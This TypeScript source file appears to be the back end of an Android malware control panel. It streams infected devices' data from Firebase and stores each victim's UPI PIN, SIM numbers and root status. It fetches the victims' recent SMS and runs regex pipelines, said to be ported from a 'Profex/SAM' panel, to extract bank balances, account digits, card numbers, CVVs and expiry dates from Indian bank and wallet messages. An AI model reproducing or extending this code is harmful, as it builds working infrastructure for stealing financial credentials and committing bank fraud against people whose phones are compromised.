/**
 * Firebase Realtime Database — Real-Time Streaming Engine
 *
 * Uses Firebase's native REST SSE endpoint:
 *   GET https://PROJECT.firebaseio.com/PATH.json?auth=SECRET
 *   Accept: text/event-stream
 *
 * Firebase pushes events in < 100ms when data changes:
 *   event: put    → full snapshot (on connect)
 *   event: patch  → partial update (field-level change, e.g. status flip)
 *   event: keep-alive → heartbeat, ignore
 *   event: cancel → access revoked, stop
 *   event: auth_revoked → token expired, stop
 *
 * This replaces ALL setInterval + fetch() polling from the old system.
 */

// ─── Resilient Firebase REST fetch (Profix pattern) ──────────────────────────
//
// Node.js 18 `AbortSignal.timeout()` throws a `TimeoutError` whose `.message`
// is literally "signal timed out" — which bubbles up visibly to the user.
//
// The Profix panel (PROFEXSRC) instead uses `AbortController + setTimeout`:
//   const ctrl = new AbortController();
//   const timer = setTimeout(() => ctrl.abort(), 15e3);
//   await fetch(url, { signal: ctrl.signal });  // throws AbortError on timeout
//   clearTimeout(timer);
//
// `AbortError` (name = "AbortError") is caught and converted to a clean message.
// This avoids the raw "signal timed out" Node.js error surfacing in the UI.
//
// Timeout is 30 s by default — large Firebase DBs can take 15–25 s to respond.

export async function firebaseFetch(
  url: string,
  options: RequestInit = {},
  timeoutMs = 30_000,
): Promise<Response> {
  const ctrl = new AbortController();
  const timer = setTimeout(() => ctrl.abort(), timeoutMs);
  try {
    const res = await fetch(url, { ...options, signal: ctrl.signal });
    clearTimeout(timer);
    return res;
  } catch (err: unknown) {
    clearTimeout(timer);
    // AbortError = our own timeout; re-throw with a readable message
    if ((err as { name?: string }).name === "AbortError") {
      throw new Error(
        `Firebase request timed out after ${timeoutMs / 1000}s. ` +
          "Check your Firebase URL, database rules, and network.",
      );
    }
    throw err;
  }
}

export interface FirebaseEvent {
  type: "put" | "patch" | "keep-alive" | "cancel" | "auth_revoked" | string;
  path: string;
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  data: any;
}

/** Parsed, normalized device object */
export interface NormalizedDevice {
  id: string;
  panelId: string;
  name: string;
  /** TRUE = online. Resolved from status | online | isOnline | active | isActive. */
  status: boolean;
  battery: number | null;
  batteryRaw: string;
  mobNo: string;
  ipAddress: string;
  androidV: string;
  storage: string;
  sdkV: string;
  cpuArch: string;
  isRoot: boolean;
  isSdCard: boolean;
  serviceProvider: string;
  upiPin: string | null;
  note: string;
  sims: SimCard[];
  joined: string;
  joinedTs: number;
  /** Unix ms — last time device reported activity (any of 10+ field name variants). */
  lastSeen: number;
  /** Raw Firebase smsAnalysis node — bankBalances, walletTransactions, cards, etc. */
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  smsAnalysis?: Record<string, any>;
}

export interface SimCard {
  phoneNumber: string;
  carrierName: string;
}

/** Parsed SMS message */
export interface NormalizedSms {
  key: string;
  message: string;
  sender: string;
  dateTime: string;
  type: "incoming" | "outgoing";
  ts: number;
}

// ─── Normalization helpers ────────────────────────────────────────────────

export function formatPhone(raw: unknown): string {
  if (!raw) return "—";
  const s = String(raw).replace(/\D/g, "");
  if (s.startsWith("91") && s.length === 12) return `+${s}`;
  if (s.length === 10) return `+91${s}`;
  if (s.length > 0) return `+${s}`;
  return "—";
}

function parseTs(dt: unknown): number {
  if (!dt) return 0;
  const s = String(dt).trim();
  if (/^\d{10}$/.test(s)) return parseInt(s) * 1000;
  if (/^\d{13}$/.test(s)) return parseInt(s);
  const d = new Date(s);
  return isNaN(d.getTime()) ? 0 : d.getTime();
}

function normalizeSims(raw: unknown): SimCard[] {
  if (!raw) return [];
  const arr = Array.isArray(raw) ? raw : Object.values(raw as object);
  return arr
    .filter(Boolean)
    .map((s: unknown) => ({
      phoneNumber: formatPhone((s as Record<string, unknown>)?.phoneNumber ?? (s as Record<string, unknown>)?.phone ?? ""),
      carrierName: String((s as Record<string, unknown>)?.carrierName ?? (s as Record<string, unknown>)?.carrier ?? "—"),
    }));
}

/**
 * Resolve online/offline from any of the 6 field name variants Android apps use.
 * Also handles string values: "online"/"true" → true, "offline"/"false" → false.
 */
// eslint-disable-next-line @typescript-eslint/no-explicit-any
function resolveStatus(raw: any): boolean {
  // Pick the first field that is defined (null counts as defined — explicitly offline)
  const candidates = [
    raw?.status,
    raw?.online,
    raw?.isOnline,
    raw?.active,
    raw?.isActive,
    raw?.deviceStatus,
  ];
  const v = candidates.find((c) => c !== undefined);
  if (v === undefined) return false;
  if (typeof v === "boolean") return v;
  if (typeof v === "number") return v !== 0;
  if (typeof v === "string") {
    const s = v.toLowerCase().trim();
    if (s === "online" || s === "true" || s === "1") return true;
    if (s === "offline" || s === "false" || s === "0" || s === "") return false;
    return Boolean(v); // non-empty string we don't recognise → truthy
  }
  return false;
}

/**
 * ProFix-style presence detection.
 *
 * ProFix (PROFEXSRC line 17637): `status: !!S.status`
 * They trust the Firebase status field DIRECTLY. No heartbeat override.
 *
 * Rules (aligned with ProFix):
 *  • status/online/isOnline/active/isActive/deviceStatus is defined → trust it
 *  • None of those fields exist → fall back to lastSeen heartbeat (10-min window)
 *
 * The old approach (heartbeat gate on PATCH events) was wrong because it used
 * `device.lastSeen` stored in seconds (not ms), making ageMs astronomical and
 * marking every `status=false` patch as permanent offline.
 */
// eslint-disable-next-line @typescript-eslint/no-explicit-any
function resolvePresence(raw: any): boolean {
  const candidates = [
    raw?.status, raw?.online, raw?.isOnline,
    raw?.active, raw?.isActive, raw?.deviceStatus,
  ];
  const hasStatusField = candidates.some((c) => c !== undefined);

  if (hasStatusField) {
    // Field exists → trust it directly (ProFix: `status: !!S.status`)
    return resolveStatus(raw);
  }

  // No status field at all — fall back to lastSeen heartbeat.
  // 10-min window is generous enough for apps that heartbeat every 5 min.
  const lastSeen = resolveLastSeen(raw);
  if (lastSeen <= 0) return false;
  return (Date.now() - lastSeen) < 10 * 60 * 1000;
}

/** Parse a lastSeen timestamp from any of the 10+ field name variants.
 *
 * ProFix pattern (line 17580 of PROFEXSRC):
 *   if (typeof A == "number") return A < 1e12 ? A * 1e3 : A;
 * Android apps often write lastSeen as 10-digit Unix seconds, not 13-digit ms.
 * Without this conversion, every heartbeat age = billions of ms → all offline.
 */
// eslint-disable-next-line @typescript-eslint/no-explicit-any
function resolveLastSeen(raw: any): number {
  const v =
    raw?.lastSeen ?? raw?.last_seen ?? raw?.lastOnline ?? raw?.last_online ??
    raw?.lastActive ?? raw?.last_active ?? raw?.timestamp ?? raw?.time ??
    raw?.dateTime ?? raw?.updatedAt ?? raw?.updated_at ?? 0;
  const n = Number(v) || 0;
  // 10-digit = Unix seconds → convert to milliseconds (ProFix approach)
  if (n > 0 && n < 1e12) return n * 1000;
  return n;
}

// eslint-disable-next-line @typescript-eslint/no-explicit-any
export function normalizeDevice(id: string, raw: any, panelId: string): NormalizedDevice {
  const sims = normalizeSims(raw?.sims);
  const firstSimPhone = sims[0]?.phoneNumber ?? "";

  return {
    id,
    panelId,
    name: raw?.modelName ?? raw?.model ?? raw?.deviceName ?? id,

    // ProFix presence: boolean fields + lastSeen heartbeat (3-min window)
    status: resolvePresence(raw),

    battery:
      raw?.battery != null
        ? parseInt(String(raw.battery).replace("%", "")) || null
        : null,
    batteryRaw: raw?.battery != null ? String(raw.battery) : "—",
    mobNo: formatPhone(raw?.mobNo ?? firstSimPhone),
    ipAddress: raw?.ip_address ?? raw?.ipAddress ?? "—",
    androidV: raw?.androidV ?? "—",
    storage: String(raw?.storage ?? "—"),
    sdkV: raw?.sdkV ?? "—",
    cpuArch: raw?.cpu_arch ?? "—",
    isRoot: Boolean(raw?.isRoot),
    isSdCard: Boolean(raw?.isSdCard),
    serviceProvider: raw?.service_provider ?? raw?.serviceProvider ?? "",
    upiPin: raw?.upipin ?? raw?.upiPin ?? null,
    note: raw?.note ?? "",
    sims,
    joined: raw?.joined ?? raw?.createdAt ?? "—",
    joinedTs: parseTs(raw?.joined ?? raw?.createdAt ?? ""),
    lastSeen: resolveLastSeen(raw),
    smsAnalysis: raw?.smsAnalysis ?? undefined,
  };
}

// eslint-disable-next-line @typescript-eslint/no-explicit-any
export function normalizeSms(key: string, raw: any): NormalizedSms | null {
  if (!raw) return null;

  let message = "";
  let sender = "";
  let dateTime = "";
  let type: "incoming" | "outgoing" = "incoming";

  if (typeof raw === "string") {
    message = raw;
    sender = "Unknown";
  } else if (typeof raw === "object") {
    message =
      raw.message ?? raw.body ?? raw.messageBody ?? raw.text ?? raw.msg ??
      raw.content ?? raw.sms ?? raw.Body ?? raw.Message ?? "";

    sender =
      raw.sender ?? raw.from ?? raw.address ?? raw.originatingAddress ??
      raw.phoneNumber ?? raw.phone ?? raw.number ?? raw.source ??
      raw.originator ?? raw.from_number ?? raw.senderId ??
      raw.senderAddress ?? raw.remoteAddress ?? raw.peerAddress ??
      String(raw.sender_id ?? raw.senderid ?? raw.shortCode ?? raw.short_code ?? "");

    if (!sender || sender === "null" || sender === "undefined" || sender === "0") {
      sender = "Unknown";
    }

    dateTime =
      raw.dateTime ?? raw.date ?? raw.time ?? raw.timestamp ?? raw.createdAt ??
      raw.receivedAt ?? raw.sentAt ?? raw.dateReceived ?? raw.dateSent ?? "";

    const rt = String(
      raw.type ?? raw.direction ?? raw.msgType ?? raw.messageType ?? raw.smsType ?? "",
    );
    type =
      rt === "2" ||
      rt.toLowerCase().includes("out") ||
      rt.toLowerCase().includes("sent")
        ? "outgoing"
        : "incoming";
  }

  if (!message && !sender) return null;

  return {
    key,
    message: message || "(no body)",
    sender: sender || "Unknown",
    dateTime,
    type,
    ts: parseTs(dateTime),
  };
}

// ─── Apply patch from Firebase partial update ────────────────────────────

// eslint-disable-next-line @typescript-eslint/no-explicit-any
export function applyPatch(device: NormalizedDevice, path: string, value: any): void {
  // path format: "/deviceId/field" or "/deviceId/nested/field"
  const parts = path.replace(/^\//, "").split("/");
  if (parts.length < 2) return;
  const field = parts[1];

  switch (field) {
    // All online/offline field name variants → ProFix presence check
    case "status":
    case "online":
    case "isOnline":
    case "active":
    case "isActive":
    case "deviceStatus": {
      // Trust the field directly — ProFix: `status: !!S.status`
      device.status = resolveStatus({ [field]: value });
      break;
    }
    case "battery":
      device.battery = value != null ? parseInt(String(value).replace("%", "")) || null : null;
      device.batteryRaw = value != null ? String(value) : "—";
      break;
    case "note":
      device.note = value ?? "";
      break;
    case "upipin":
    case "upiPin":
      device.upiPin = value ?? null;
      break;
    case "ip_address":
    case "ipAddress":
      device.ipAddress = value ?? "—";
      break;
    case "modelName":
    case "model":
    case "deviceName":
      device.name = value ?? device.name;
      break;
    case "mobNo":
      device.mobNo = formatPhone(value);
      break;
    // lastSeen field variants — also recompute presence (ProFix heartbeat check)
    case "lastSeen":
    case "last_seen":
    case "lastOnline":
    case "last_online":
    case "lastActive":
    case "last_active":
    case "timestamp":
    case "updatedAt":
    case "updated_at": {
      // Apply the same 10-digit seconds → ms conversion as resolveLastSeen
      const lsRaw = Number(value) || 0;
      device.lastSeen = lsRaw > 0 && lsRaw < 1e12 ? lsRaw * 1000 : lsRaw;
      // ProFix: only status/online/etc. field changes alter online state.
      // A lastSeen heartbeat update does NOT flip status — trust the field directly.
      break;
    }
  }
}

// ─── Firebase SSE Stream ─────────────────────────────────────────────────

function sleep(ms: number): Promise<void> {
  return new Promise((r) => setTimeout(r, ms));
}

/**
 * Async generator that connects to Firebase REST SSE endpoint and yields events.
 * Automatically reconnects with exponential backoff on errors.
 * Stops when the AbortSignal fires.
 */
export async function* streamFirebasePath(
  firebaseUrl: string,
  secret: string,
  path: string,
  signal: AbortSignal,
): AsyncGenerator<FirebaseEvent> {
  let backoff = 1000;

  while (!signal.aborted) {
    const url =
      `${firebaseUrl.replace(/\/$/, "")}/${path}.json` +
      `?auth=${encodeURIComponent(secret)}`;

    try {
      const response = await fetch(url, {
        headers: {
          Accept: "text/event-stream",
          "Cache-Control": "no-cache",
        },
        signal,
      });

      if (!response.ok || !response.body) {
        await sleep(backoff);
        backoff = Math.min(backoff * 2, 30_000);
        continue;
      }

      backoff = 1000; // reset on successful connect

      const reader = response.body.getReader();
      const decoder = new TextDecoder();
      let buf = "";
      let currentEvent = "";

      try {
        while (!signal.aborted) {
          const { done, value } = await reader.read();
          if (done) break;

          buf += decoder.decode(value, { stream: true });
          const lines = buf.split("\n");
          buf = lines.pop() ?? "";

          for (const line of lines) {
            if (line.startsWith("event: ")) {
              currentEvent = line.slice(7).trim();
            } else if (line.startsWith("data: ")) {
              const dataStr = line.slice(6).trim();

              if (currentEvent === "keep-alive" || dataStr === "null") {
                currentEvent = "";
                continue;
              }

              if (
                currentEvent === "cancel" ||
                currentEvent === "auth_revoked"
              ) {
                yield { type: currentEvent, path: "", data: null };
                return; // stop — no point reconnecting
              }

              if (currentEvent && dataStr) {
                try {
                  const parsed = JSON.parse(dataStr) as {
                    path: string;
                    data: unknown;
                  };
                  yield {
                    type: currentEvent,
                    path: parsed.path ?? "",
                    data: parsed.data,
                  };
                } catch {
                  // ignore malformed JSON
                }
              }
              currentEvent = "";
            }
          }
        }
      } finally {
        reader.cancel().catch(() => {});
      }
    } catch (err) {
      if (signal.aborted) return;
      await sleep(backoff);
      backoff = Math.min(backoff * 2, 30_000);
    }
  }
}

// ─── SMS Analysis Pipeline (ported from Profex/SAM panel) ───────────────────
//
// Profex computes smsAnalysis by fetching raw SMS from messages/{deviceId}
// and running regex pipelines on each message. This works even when the
// Android app does NOT write a smsAnalysis node to Firebase directly.
//
// Functions ported: e1 (bank balance), Wp (card info), yh (phone), gh (network),
// Xu (orchestrator → SmsAnalysis). Translated verbatim to TypeScript.

export interface BankBalance {
  bankName: string;
  senderName: string;
  availableBalance: string;
  transactionAmount?: string;
  transactionType?: "credit" | "debit";
  accountLast4?: string;
  phoneFromSms?: string;
  networkFromSms?: string;
  rawSms: string;
  detectedAt: string;
}

export interface CardInfo {
  cardLast4: string;
  cardType: string;
  cvv?: string;
  expiry?: string;
  rawSms: string;
}

export interface SmsAnalysis {
  bankBalances: BankBalance[];
  cards: CardInfo[];
  phoneNumbers: string[];
  networks: string[];
}

// ─── Bank sender → display name ──────────────────────────────────────────────

const BANK_SENDERS: [RegExp, string][] = [
  [/HDFCBK|HDFCBANK|HDFC/i, "HDFC Bank"],
  [/SBIIN|SBIINB|SBI/i, "SBI"],
  [/ICICIB|ICICI/i, "ICICI Bank"],
  [/AXISBK|AXISBANK|AXIS/i, "Axis Bank"],
  [/KOTAKB|KOTAK/i, "Kotak Bank"],
  [/PNBSMS|PNB/i, "PNB"],
  [/BOIIND|BOI/i, "Bank of India"],
  [/CANBNK|CANARA/i, "Canara Bank"],
  [/UNIONB|UBISMS/i, "Union Bank"],
  [/YESBNK|YESBANK/i, "Yes Bank"],
  [/IDBIBK|IDBI/i, "IDBI Bank"],
  [/INDUSB|INDUSIND/i, "IndusInd Bank"],
  [/FEDERAL|FEDBNK/i, "Federal Bank"],
  [/RBLBNK|RBL/i, "RBL Bank"],
  [/PAYTM/i, "Paytm"],
  [/PHONEPE|PHNPE/i, "PhonePe"],
  [/GPAY|GOOGLEPAY/i, "Google Pay"],
  [/AMAZONPAY/i, "Amazon Pay"],
  [/BAJAJFIN/i, "Bajaj Finance"],
  [/CRED/i, "CRED"],
  [/AIRTEL/i, "Airtel Payments"],
  [/JIOMNY|JIOMONEY/i, "Jio Money"],
];

function resolveBankName(sender: string): string {
  for (const [re, name] of BANK_SENDERS) {
    if (re.test(sender)) return name;
  }
  const m = sender.toUpperCase().match(/(?:[A-Z]{2}-)?([A-Z0-9]+)/);
  return m ? m[1] : sender || "Bank";
}

// ─── Regex pattern banks ─────────────────────────────────────────────────────

const BAL_PATTERNS = [
  /Aval(?:\.|\s)+Bal(?:\.|\s)+(?:INR|Rs\.?|₹)[\s]*([0-9,]+\.?[0-9]*)/i,
  /Avl(?:\.|\s)+Bal(?:\.|\s)+(?:INR|Rs\.?|₹)[\s]*([0-9,]+\.?[0-9]*)/i,
  /Avbl(?:\.|\s)+Bal(?:\.|\s)+(?:INR|Rs\.?|₹)[\s]*([0-9,]+\.?[0-9]*)/i,
  /Available\s+Bal(?:ance)?[\s:]+(?:INR|Rs\.?|₹)?[\s]*([0-9,]+\.?[0-9]*)/i,
  /Avl(?:able)?\.?\s*Bal(?:ance)?\.?[\s:]+(?:INR|Rs\.?|₹)?[\s]*([0-9,]+\.?[0-9]*)/i,
  /(?:Avl|Avbl|Aval)\.?\s*(?:Bal(?:ance)?)\.?\s*(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)/i,
  /Bal(?:ance)?\.?\s+(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)/i,
  /(?:Avl|Avail|Aval).*?(?:INR|Rs\.?|₹)\s*([0-9]{4,}(?:,[0-9]{3})*(?:\.[0-9]{1,2})?)/i,
  /Bal[.:]?\s*([0-9]{4,}(?:,[0-9]{3})*(?:\.[0-9]{1,2})?)/i,
];

const TXN_PATTERNS = [
  /(?:debited|credited|withdrawn|deposited)(?:\s+(?:by|with|for|of))?\s+(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)/i,
  /(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)\s+(?:debited|credited|withdrawn)/i,
  /^(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)/i,
  /(?:INR|Rs\.?|₹)\s*([0-9]{2,}(?:,[0-9]{3})*(?:\.[0-9]{1,2})?)/i,
];

const ACCT_PATTERNS = [
  /(?:A\/C|account|acct)(?:\s+(?:no\.?|number|#))?[\s:*xX]+([xX*]{0,4}[0-9]{4})/i,
  /[xX*]{4,}([0-9]{4})/,
  /ending\s+(?:with\s+)?([0-9]{4})/i,
];

const CARD_PATTERNS = [
  /(?:card|debit|credit)(?:\s+(?:no\.?|number|ending|#))?[\s:*xX]+([xX*]{0,8}[0-9]{4})/i,
  /card\s+([0-9]{4}\s?[0-9]{4}\s?[0-9]{4}\s?[0-9]{4})/i,
];

const CVV_PATTERNS = [
  /CVV[\s:]+([0-9]{3,4})/i,
  /(?:cvv|cvc|security\s+code)[\s:]+([0-9]{3,4})/i,
];

const EXPIRY_PATTERNS = [
  /(?:expiry|exp|valid\s+thru?|valid\s+till)[\s:]+([0-9]{1,2}\/[0-9]{2,4})/i,
  /([0-9]{1,2})\/([0-9]{2,4})\s+(?:expiry|exp)/i,
];

// ─── Network / carrier detection ─────────────────────────────────────────────

const NETWORK_BY_SENDER: [RegExp, string][] = [
  [/AIRTEL|JD-AIRTEL|VM-AIRTEL/i, "Airtel"],
  [/JIOINF|JIOMSG|JIONET|JIO/i, "Jio"],
  [/BSNLSM|BSNL/i, "BSNL"],
  [/VISMOB|VI-|VODA|VODAFONE/i, "Vodafone"],
  [/IDEACEL|IDEA/i, "Vi (Idea)"],
  [/MTNL/i, "MTNL"],
  [/TATADOC|DOCOMO/i, "Docomo"],
  [/UNINOR/i, "Uninor"],
  [/TELENOR/i, "Telenor"],
];

const NETWORK_BY_TEXT: [RegExp, string][] = [
  [/\bJio\b/i, "Jio"],
  [/\bAirtel\b/i, "Airtel"],
  [/\bBSNL\b/i, "BSNL"],
  [/\bVodafone\b/i, "Vodafone"],
  [/\b(?:Idea|Vi)\b/i, "Vi"],
  [/\bMTNL\b/i, "MTNL"],
  [/\bDocomo\b/i, "Docomo"],
  [/\bReliance\b/i, "Reliance"],
  [/\bTelenor\b/i, "Telenor"],
  [/\bUninor\b/i, "Uninor"],
  [/\bVideocon\b/i, "Videocon"],
];

function smsExtractNetwork(text: string, sender: string): string | null {
  for (const [re, name] of NETWORK_BY_SENDER) {
    if (re.test(sender)) return name;
  }
  const combined = text + " " + sender;
  for (const [re, name] of NETWORK_BY_TEXT) {
    if (re.test(combined)) return name;
  }
  return null;
}

// ─── Phone number extraction ──────────────────────────────────────────────────

const PHONE_PATTERNS = [
  /(?:Jio|JIO)\s+(?:Number|No\.?|Num)\s*[:\-]\s*([6-9][0-9]{9})/,
  /(?:Airtel|AIRTEL)\s+(?:Number|No\.?|Num)\s*[:\-]\s*([6-9][0-9]{9})/,
  /registered\s+(?:mobile\s+)?(?:number|no\.?)\s*[:\-]?\s*([6-9][0-9]{9})/i,
  /(?:your\s+)?(?:mobile|mob\.?|phone|contact)\s+(?:no\.?|number|num)\s*[:\-]\s*([6-9][0-9]{9})/i,
  /Number\s*[:\-]\s*([6-9][0-9]{9})/i,
  /(\+91[-\s]?[6-9][0-9]{9})/,
  /(?:\b91)([6-9][0-9]{9})\b/,
  /(?:^|\s|:)([6-9][0-9]{9})(?:\s|$|\.)/,
];

function smsExtractPhone(text: string): string | null {
  for (const re of PHONE_PATTERNS) {
    const m = text.match(re);
    if (m?.[1]) {
      const d = m[1].replace(/[^0-9]/g, "");
      if (d.length === 10 && /^[6-9]/.test(d)) return d;
      if (d.length === 12 && d.startsWith("91") && /^91[6-9]/.test(d)) return d.slice(2);
    }
  }
  return null;
}

// ─── Card info extraction (Wp) ───────────────────────────────────────────────

function smsExtractCard(text: string): CardInfo | null {
  const upper = text.toUpperCase();
  if (
    !upper.includes("CARD") &&
    !upper.includes("CVV") &&
    !upper.includes("CREDIT") &&
    !upper.includes("DEBIT")
  ) return null;

  let cardLast4 = "";
  for (const re of CARD_PATTERNS) {
    const m = text.match(re);
    if (m?.[1]) {
      const d = m[1].replace(/[^0-9]/g, "");
      if (d.length >= 4) { cardLast4 = d.slice(-4); break; }
    }
  }
  if (!cardLast4) return null;

  let cardType = "";
  if (/VISA/i.test(text)) cardType = "VISA";
  else if (/MASTER(?:CARD)?/i.test(text)) cardType = "Mastercard";
  else if (/RUPAY/i.test(text)) cardType = "RuPay";
  else if (/AMEX|AMERICAN\s+EXPRESS/i.test(text)) cardType = "Amex";
  else if (/credit/i.test(text)) cardType = "Credit Card";
  else if (/debit/i.test(text)) cardType = "Debit Card";

  let cvv: string | undefined;
  for (const re of CVV_PATTERNS) {
    const m = text.match(re);
    if (m?.[1]) { cvv = m[1]; break; }
  }

  let expiry: string | undefined;
  for (const re of EXPIRY_PATTERNS) {
    const m = text.match(re);
    if (m?.[1]) { expiry = m[1]; break; }
  }

  return { cardLast4, cardType, cvv, expiry, rawSms: text };
}

// ─── Bank balance extraction (e1) ────────────────────────────────────────────

function smsExtractBankBalance(text: string, sender: string): BankBalance | null {
  if (!text || text.trim().length < 8) return null;

  const upper = text.toUpperCase();
  const isBankingMsg =
    /AVL|AVAL|AVBL|AVAIL|BALANCE|BAL\.|CREDITED|DEBITED|WITHDRAWN|DEPOSITED|TRANSACTION|A\/C|ACCOUNT|INR|RUPEE/.test(
      upper,
    );
  const isBankSender =
    /^[A-Z]{2}-[A-Z0-9]+$/.test(sender) &&
    BANK_SENDERS.some(([re]) => re.test(sender));

  if (!isBankingMsg && !isBankSender) return null;

  let availableBalance: string | null = null;
  for (const re of BAL_PATTERNS) {
    const m = text.match(re);
    if (m?.[1]) {
      const v = m[1].replace(/,/g, "");
      if (parseFloat(v) >= 0) { availableBalance = v; break; }
    }
  }
  if (!availableBalance) return null;

  let transactionAmount: string | undefined;
  for (const re of TXN_PATTERNS) {
    const m = text.match(re);
    if (m?.[1]) {
      const v = m[1].replace(/,/g, "");
      if (v !== availableBalance) { transactionAmount = v; break; }
    }
  }

  let transactionType: "credit" | "debit" | undefined;
  if (/credit(?:ed)?/i.test(text)) transactionType = "credit";
  else if (/debit(?:ed)?|withdraw|paid|purchase|spent/i.test(text)) transactionType = "debit";

  let accountLast4: string | undefined;
  for (const re of ACCT_PATTERNS) {
    const m = text.match(re);
    if (m?.[1]) { accountLast4 = m[1].replace(/[^0-9]/g, "").slice(-4); break; }
  }

  const phoneFromSms = smsExtractPhone(text);
  const networkFromSms = smsExtractNetwork(text, sender);

  return {
    bankName: resolveBankName(sender) || "Bank",
    senderName: sender || "Unknown",
    availableBalance,
    transactionAmount,
    transactionType,
    accountLast4,
    phoneFromSms: phoneFromSms ?? undefined,
    networkFromSms: networkFromSms ?? undefined,
    rawSms: text,
    detectedAt: new Date().toISOString(),
  };
}

/**
 * Analyze an array of normalized SMS messages and extract bank balances,
 * card info, phone numbers, and carrier networks.
 *
 * Ported from Profex/SAM panel's Xu() + e1() + Wp() + yh() + gh() functions.
 * Works on any device regardless of whether the Android app writes smsAnalysis
 * to Firebase — the data is computed from raw SMS text.
 */
export function analyzeSmsMessages(messages: NormalizedSms[]): SmsAnalysis {
  const bankBalances: BankBalance[] = [];
  const cards: CardInfo[] = [];
  const phoneNumbers = new Set<string>();
  const networks = new Set<string>();

  for (const msg of messages) {
    const balance = smsExtractBankBalance(msg.message, msg.sender);
    if (balance) {
      if (msg.dateTime) balance.detectedAt = msg.dateTime;
      bankBalances.push(balance);
    }
    const card = smsExtractCard(msg.message);
    if (card) cards.push(card);

    const phone = smsExtractPhone(msg.message);
    if (phone) phoneNumbers.add(phone);

    const network = smsExtractNetwork(msg.message, msg.sender);
    if (network) networks.add(network);
  }

  return {
    bankBalances,
    cards,
    phoneNumbers: [...phoneNumbers],
    networks: [...networks],
  };
}

/**
 * Fetch the last 150 SMS for a device and run the full analysis pipeline.
 * Returns null if the device has no messages or the fetch fails.
 *
 * This is the Profex approach: compute smsAnalysis from messages/{deviceId}
 * rather than reading a pre-built node written by the Android app.
 */
export async function fetchSmsAnalysis(
  firebaseUrl: string,
  secret: string,
  deviceId: string,
  timeoutMs = 12_000,
): Promise<SmsAnalysis | null> {
  try {
    const messages = await fetchSms(firebaseUrl, secret, deviceId, 150, timeoutMs);
    if (!messages.length) return null;
    return analyzeSmsMessages(messages);
  } catch {
    return null;
  }
}

// ─────────────────────────────────────────────────────────────────────────────

/**
 * Fetch the last N SMS for a device via Firebase REST (non-streaming).
 * Uses orderBy + limitToLast to avoid downloading the entire history.
 */
export async function fetchSms(
  firebaseUrl: string,
  secret: string,
  deviceId: string,
  limit = 100,
  timeoutMs = 30_000,
): Promise<NormalizedSms[]> {
  // Try multiple known SMS path patterns
  const paths = [
    `messages/${deviceId}`,
    `sms/${deviceId}`,
    `clients/${deviceId}/messages`,
  ];

  for (const path of paths) {
    const url =
      `${firebaseUrl.replace(/\/$/, "")}/${path}.json` +
      `?auth=${encodeURIComponent(secret)}` +
      `&orderBy=%22%24key%22&limitToLast=${limit}`;

    try {
      const res = await firebaseFetch(url, {}, timeoutMs);
      if (!res.ok) continue;
      const data = await res.json();
      if (data === null) continue;

      const entries = Array.isArray(data)
        ? data.map((v, i) => [String(i), v] as [string, unknown])
        : Object.entries(data as Record<string, unknown>);

      const msgs = entries
        .map(([k, v]) => normalizeSms(k, v))
        .filter((m): m is NormalizedSms => m !== null);

      msgs.sort((a, b) =>
        a.ts > 0 && b.ts > 0 ? b.ts - a.ts : String(b.key).localeCompare(String(a.key)),
      );
      return msgs;
    } catch {
      continue;
    }
  }

  return [];
}

/**
 * Write a value to Firebase via REST.
 */
export async function firebaseSet(
  firebaseUrl: string,
  secret: string,
  path: string,
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  value: any,
): Promise<void> {
  const url =
    `${firebaseUrl.replace(/\/$/, "")}/${path}.json` +
    `?auth=${encodeURIComponent(secret)}`;

  const res = await firebaseFetch(
    url,
    { method: "PUT", headers: { "Content-Type": "application/json" }, body: JSON.stringify(value) },
    30_000,
  );

  if (!res.ok) {
    const body = await res.text().catch(() => "");
    throw new Error(`Firebase write failed: ${res.status} ${body}`);
  }
}

/**
 * Delete a path in Firebase via REST.
 */
export async function firebaseDelete(
  firebaseUrl: string,
  secret: string,
  path: string,
): Promise<void> {
  const url =
    `${firebaseUrl.replace(/\/$/, "")}/${path}.json` +
    `?auth=${encodeURIComponent(secret)}`;

  const res = await firebaseFetch(url, { method: "DELETE" }, 30_000);

  if (!res.ok) {
    const body = await res.text().catch(() => "");
    throw new Error(`Firebase delete failed: ${res.status} ${body}`);
  }
}
